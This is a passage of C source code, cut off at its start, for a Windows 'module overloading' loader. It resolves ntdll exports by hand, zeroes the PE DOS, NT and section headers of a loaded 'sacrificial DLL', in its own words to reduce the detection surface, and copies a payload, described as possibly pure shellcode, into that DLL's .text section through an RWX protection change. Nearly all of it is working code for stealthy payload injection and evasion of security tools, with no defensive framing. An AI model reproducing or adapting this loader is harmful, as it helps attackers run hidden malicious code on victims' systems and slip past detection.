        Context->LastError = STATUS_NOT_FOUND;
        return NULL;
    }

    // Calculate function address
    Functions = (PULONG)((PUCHAR)Context->NtdllBaseAddress + ExportDir->AddressOfFunctions);
    ExportTargetRva = Functions[AdjustedOrdinal];
    if (IsImageRangeValid(ExportTargetRva, sizeof(CHAR), Context->NtdllImageSize) &&
        ExportTargetRva >= Context->NtdllExportRva &&
        ExportTargetRva < (Context->NtdllExportRva + Context->NtdllExportSize)) {
        FunctionAddress = ResolveForwarderExport(
            Context,
            (PCHAR)((PUCHAR)Context->NtdllBaseAddress + ExportTargetRva)
        );
        if (FunctionAddress == NULL) {
            return NULL;
        }
    }
    else {
        FunctionAddress = (PVOID)((PUCHAR)Context->NtdllBaseAddress + ExportTargetRva);
    }

    if (Context->ResolvedFunctionCount < 256) {
        Context->ResolvedFunctions[Context->ResolvedFunctionCount] = (ULONG_PTR)FunctionAddress;
        Context->ResolvedFunctionCount++;
        Context->ImportsResolved++;
    }

    Context->TotalOperations++;
    return FunctionAddress;
}

//------------------------------------------------------------------------------
// WalkExportDirectory
//
// Walks the Export Directory to find a function by name.
// Returns the RVA of the function if found.
//
// Parameters:
//   ExportDir    - Pointer to export directory
//   TargetName   - Name of the target function
//   FunctionRva  - Output pointer to function RVA
//
// Returns:
//   TRUE if found, FALSE otherwise
//------------------------------------------------------------------------------

BOOLEAN WalkExportDirectory(
    IN PEXPORT_DIRECTORY ExportDir,
    IN PVOID BaseAddress,
    IN SIZE_T ImageSize,
    IN PCHAR TargetName,
    OUT PULONG FunctionRva
)
{
    PCHAR FunctionName;
    PULONG Names;
    PUSHORT NameOrdinals;
    ULONG NameRva;
    ULONG OrdinalIndex;
    ULONG StringCompareResult;
    SIZE_T NameLengthLimit;
    BOOLEAN NameTerminated;

    if (ExportDir == NULL || BaseAddress == NULL || TargetName == NULL || FunctionRva == NULL) {
        return FALSE;
    }

    *FunctionRva = 0;

    if (!IsImageRangeValid(
        ExportDir->AddressOfNames,
        (SIZE_T)ExportDir->NumberOfNames * sizeof(ULONG),
        ImageSize
    )) {
        return FALSE;
    }

    if (!IsImageRangeValid(
        ExportDir->AddressOfNameOrdinals,
        (SIZE_T)ExportDir->NumberOfNames * sizeof(USHORT),
        ImageSize
    )) {
        return FALSE;
    }

    if (!IsImageRangeValid(
        ExportDir->AddressOfFunctions,
        (SIZE_T)ExportDir->NumberOfFunctions * sizeof(ULONG),
        ImageSize
    )) {
        return FALSE;
    }

    Names = (PULONG)((PUCHAR)BaseAddress + ExportDir->AddressOfNames);
    NameOrdinals = (PUSHORT)((PUCHAR)BaseAddress + ExportDir->AddressOfNameOrdinals);

    // Iterate through name directory
    for (ULONG i = 0; i < ExportDir->NumberOfNames; i++) {
        NameRva = Names[i];

        if (!IsImageRangeValid(NameRva, sizeof(CHAR), ImageSize)) {
            continue;
        }

        FunctionName = (PCHAR)((PUCHAR)BaseAddress + NameRva);
        NameLengthLimit = ImageSize - NameRva;
        NameTerminated = FALSE;

        for (SIZE_T NameIndex = 0; NameIndex < NameLengthLimit; NameIndex++) {
            if (FunctionName[NameIndex] == '\0') {
                NameTerminated = TRUE;
                break;
            }
        }

        if (!NameTerminated) {
            continue;
        }

        // Compare function name (case-insensitive)
        StringCompareResult = _stricmp(FunctionName, TargetName);

        if (StringCompareResult == 0) {
            // Found matching name, get ordinal
            OrdinalIndex = NameOrdinals[i];

            // Validate ordinal is within function table
            if (OrdinalIndex < ExportDir->NumberOfFunctions) {
                *FunctionRva = OrdinalIndex;
                return TRUE;
            }
        }
    }

    return FALSE;
}

//------------------------------------------------------------------------------
// ScrubDosHeader
//
// Zeros out the DOS header after the payload is resident,
// reducing the detection surface.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//
// Returns:
//   STATUS_SUCCESS on success, NTSTATUS error code otherwise
//------------------------------------------------------------------------------

NTSTATUS ScrubDosHeader(
    IN PMODULE_OVERLOADING_CONTEXT Context
)
{
    PDOS_HEADER DosHeader;
    SIZE_T DosHeaderSize;

    if (Context == NULL || Context->DosHeader == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    DosHeader = Context->DosHeader;

    // Preserve e_lfanew for potential recovery
    ULONG NtHeadersOffset = DosHeader->e_lfanew;

    // Zero out entire DOS header (first 64 bytes)
    DosHeaderSize = sizeof(DOS_HEADER);
    RtlZeroMemory(DosHeader, DosHeaderSize);

    // Restore e_lfanew for compatibility
    DosHeader->e_lfanew = NtHeadersOffset;

    Context->ScrubbedHeaderSize += DosHeaderSize;
    Context->TotalOperations++;

    return STATUS_SUCCESS;
}

//------------------------------------------------------------------------------
// ScrubNtHeaders
//
// Zeros out the NT Headers (File Header and Optional Header)
// after the payload is resident.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//
// Returns:
//   STATUS_SUCCESS on success, NTSTATUS error code otherwise
//------------------------------------------------------------------------------

NTSTATUS ScrubNtHeaders(
    IN PMODULE_OVERLOADING_CONTEXT Context
)
{
    PNT_HEADERS NtHeaders;
    SIZE_T NtHeadersSize;

    if (Context == NULL || Context->NtHeaders == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    NtHeaders = Context->NtHeaders;

    // Calculate total NT headers size
    NtHeadersSize = sizeof(ULONG) +  // Signature
                     sizeof(IMAGE_FILE_HEADER) +  // File Header
                     NtHeaders->OptionalHeader.SizeOfHeaders -  // Full optional header size
                     sizeof(IMAGE_FILE_HEADER);

    // Zero out NT headers
    RtlZeroMemory(NtHeaders, NtHeadersSize);

    Context->ScrubbedHeaderSize += NtHeadersSize;
    Context->TotalOperations++;

    return STATUS_SUCCESS;
}

//------------------------------------------------------------------------------
// ScrubSectionHeaders
//
// Zeros out the Section Headers after the payload is resident.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//
// Returns:
//   STATUS_SUCCESS on success, NTSTATUS error code otherwise
//------------------------------------------------------------------------------

NTSTATUS ScrubSectionHeaders(
    IN PMODULE_OVERLOADING_CONTEXT Context
)
{
    PSECTION_HEADER SectionHeaders;
    SIZE_T SectionHeadersSize;

    if (Context == NULL || Context->SectionHeaders == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    SectionHeaders = Context->SectionHeaders;
    SectionHeadersSize = sizeof(SECTION_HEADER) * Context->NumberOfSections;

    // Zero out all section headers
    RtlZeroMemory(SectionHeaders, SectionHeadersSize);

    Context->ScrubbedHeaderSize += SectionHeadersSize;
    Context->TotalOperations++;

    return STATUS_SUCCESS;
}

//------------------------------------------------------------------------------
// PerformHeaderScrubbing
//
// Executes the complete header scrubbing routine,
// zeroing out DOS, NT, and Section headers.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//
// Returns:
//   STATUS_SUCCESS on success, NTSTATUS error code otherwise
//------------------------------------------------------------------------------

NTSTATUS PerformHeaderScrubbing(
    IN PMODULE_OVERLOADING_CONTEXT Context
)
{
    NTSTATUS Status;

    if (Context == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    // Execute scrubbing in order
    Status = ScrubDosHeader(Context);
    if (!IS_SUCCESS(Status)) {
        return Status;
    }

    Status = ScrubNtHeaders(Context);
    if (!IS_SUCCESS(Status)) {
        return Status;
    }

    Status = ScrubSectionHeaders(Context);
    if (!IS_SUCCESS(Status)) {
        return Status;
    }

    Context->HeadersScrubbed = TRUE;
    Context->State = ModuleOverloadingHeadersScrubbed;

    return STATUS_SUCCESS;
}

//------------------------------------------------------------------------------
// VerifyHeaderScrubbing
//
// Verifies that header scrubbing has been completed
// by checking the context state and scrubbed size.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//
// Returns:
//   TRUE if scrubbing verified, FALSE otherwise
//------------------------------------------------------------------------------

BOOLEAN VerifyHeaderScrubbing(
    IN PMODULE_OVERLOADING_CONTEXT Context
)
{
    if (Context == NULL) {
        return FALSE;
    }

    // Check scrubbing flag
    if (Context->HeadersScrubbed == FALSE) {
        return FALSE;
    }

    // Verify scrubbed size is non-zero
    if (Context->ScrubbedHeaderSize == 0) {
        return FALSE;
    }

    // Verify state is post-scrubbing
    if (Context->State != ModuleOverloadingHeadersScrubbed &&
        Context->State != ModuleOverloadingPayloadInjected) {
        return FALSE;
    }

    return TRUE;
}

//------------------------------------------------------------------------------
// InjectPayloadToTextSection
//
// Injects the custom payload into the .text section
// of the loaded sacrificial DLL.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//   Payload    - Pointer to payload buffer
//   PayloadSize - Size of the payload
//
// Returns:
//   STATUS_SUCCESS on success, NTSTATUS error code otherwise
//------------------------------------------------------------------------------

NTSTATUS RegisterPayloadExceptionTable(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    IN PVOID PayloadBase,
    IN SIZE_T PayloadSize
)
{
    NTSTATUS Status;

    if (Context == NULL || PayloadBase == NULL || PayloadSize == 0) {
        return STATUS_INVALID_PARAMETER;
    }

    Status = TryRegisterExceptionTableForImage(Context, PayloadBase, PayloadSize);
    if (Status == STATUS_NOT_FOUND) {
        // Payload has no unwind metadata - not an error for pure shellcode blobs.
        return STATUS_SUCCESS;
    }

    return Status;
}

NTSTATUS InjectPayloadToTextSection(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    IN PVOID Payload,
    IN SIZE_T PayloadSize
)
{
    NTSTATUS Status;
    PVOID TextSectionBase;
    SIZE_T TextSectionSize;
    DWORD OldProtection;
    DWORD RestoredProtection;

    if (Context == NULL || Payload == NULL || PayloadSize == 0) {
        return STATUS_INVALID_PARAMETER;
    }

    // Validate payload size against .text section capacity
    if (PayloadSize > Context->TextSectionSize) {
        Context->LastError = STATUS_BUFFER_TOO_SMALL;
        return STATUS_BUFFER_TOO_SMALL;
    }

    TextSectionBase = Context->TextSectionBase;

    // Change protection to allow writing
    TextSectionSize = PayloadSize;
    if (!VirtualProtect(
            TextSectionBase,
            TextSectionSize,
            PAGE_EXECUTE_READWRITE,
            &OldProtection)) {
        Status = STATUS_UNSUCCESSFUL;
        Context->LastError = Status;
        return Status;
    }

    Status = STATUS_SUCCESS;

    // Copy payload to .text section
    RtlCopyMemory(TextSectionBase, Payload, PayloadSize);
    Context->PayloadBuffer = Payload;
    Context->PayloadSize = PayloadSize;

    // Restore original protection returned by the first protection change.
    TextSectionSize = PayloadSize;
    if (!VirtualProtect(
        TextSectionBase,
        TextSectionSize,
        OldProtection,
        &RestoredProtection
    )) {
        Status = STATUS_UNSUCCESSFUL;
        Context->LastError = Status;
        return Status;
    }

    FlushInstructionCache(GetCurrentProcess(), TextSectionBase, PayloadSize);

    Status = RegisterPayloadExceptionTable(Context, TextSectionBase, PayloadSize);
    if (!IS_SUCCESS(Status)) {
        Context->LastError = Status;
        return Status;
    }

    Context->InjectionTime = QuerySystemTimeStamp();
    Context->State = ModuleOverloadingPayloadInjected;
    Context->TotalOperations++;

    return STATUS_SUCCESS;
}

//------------------------------------------------------------------------------
// CleanupModuleOverloading
//
// Cleans up all resources associated with Module Overloading.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//------------------------------------------------------------------------------

VOID CleanupModuleOverloading(
    IN PMODULE_OVERLOADING_CONTEXT Context
)
{
    if (Context == NULL) {
        return;
    }

    if (Context->RuntimeTableRegistered) {
        RtlDeleteFunctionTable(Context->RuntimeFunctionTable);
        Context->RuntimeFunctionTable = NULL;
        Context->RuntimeFunctionCount = 0;
        Context->RuntimeImageBase = 0;
        Context->RuntimeTableRegistered = FALSE;
    }

    // Unload sacrificial DLL if loaded
    if (Context->DllHandle != NULL) {
        FreeLibrary((HMODULE)Context->DllHandle);
        Context->DllHandle = NULL;
        Context->DllBaseAddress = NULL;
    }

    // Unload ntdll.dll if loaded for export resolution
    if (Context->NtdllBaseAddress != NULL) {
        FreeLibrary((HMODULE)Context->NtdllBaseAddress);
        Context->NtdllBaseAddress = NULL;
        Context->NtdllImageSize = 0;
        Context->NtdllExportDirectory = NULL;
        Context->NtdllExportRva = 0;
        Context->NtdllExportSize = 0;
    }

    // Reset state
    Context->State = ModuleOverloadingIdle;
    Context->HeadersScrubbed = FALSE;
    Context->TotalOperations = 0;

    // Zero out context
    RtlZeroMemory(Context, sizeof(MODULE_OVERLOADING_CONTEXT));
    Context->Tag = MODULE_OVERLOADING_TAG;
}
